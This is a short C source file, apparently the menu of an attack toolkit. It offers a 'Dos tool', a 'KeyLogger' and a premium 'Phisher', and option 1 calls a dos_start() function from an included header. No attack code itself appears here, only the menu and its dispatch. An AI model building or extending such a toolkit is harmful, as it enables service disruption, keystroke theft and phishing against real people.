#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include "../cli_colors.h"
#include "../Dos.h"


void option_choose()
{
    const bool PDOS = false;
    const bool PLOGGER = false;
    const bool PPHISHER = true;

    const char* premium_error = "Sorry, this is a premium function!\n";


    int option;

    prinf_magenta_bold("\n[?] Choose an option:");
          prinf_orange("    1. Dos tool");
          prinf_orange("    2. KeyLogger");
          prinf_orange("    3. Phisher (Premium)");

    prinf_red("\n> \033[37m");
    scanf("%d", &option);

    if(option == 1)
    {
        if(PDOS == true)
        {
            SEND_ERROR_bold(premium_error);
        }
        else
        {
            dos_start();
        }
    } 
    else if(option == 2)
    {
        if(PLOGGER == true)
        {
            SEND_ERROR_bold(premium_error);
        }
        else
        {
            SEND_ERROR_bold("[-] This tool is under maintenance.\n");
        }
    }
    else if(option == 3)
    {
        if(PPHISHER == true)
        {
            SEND_ERROR_bold(premium_error);
        }
        else
        {
            SEND_ERROR_bold("[-] This tool is under maintenance.\n");
        }

    }

}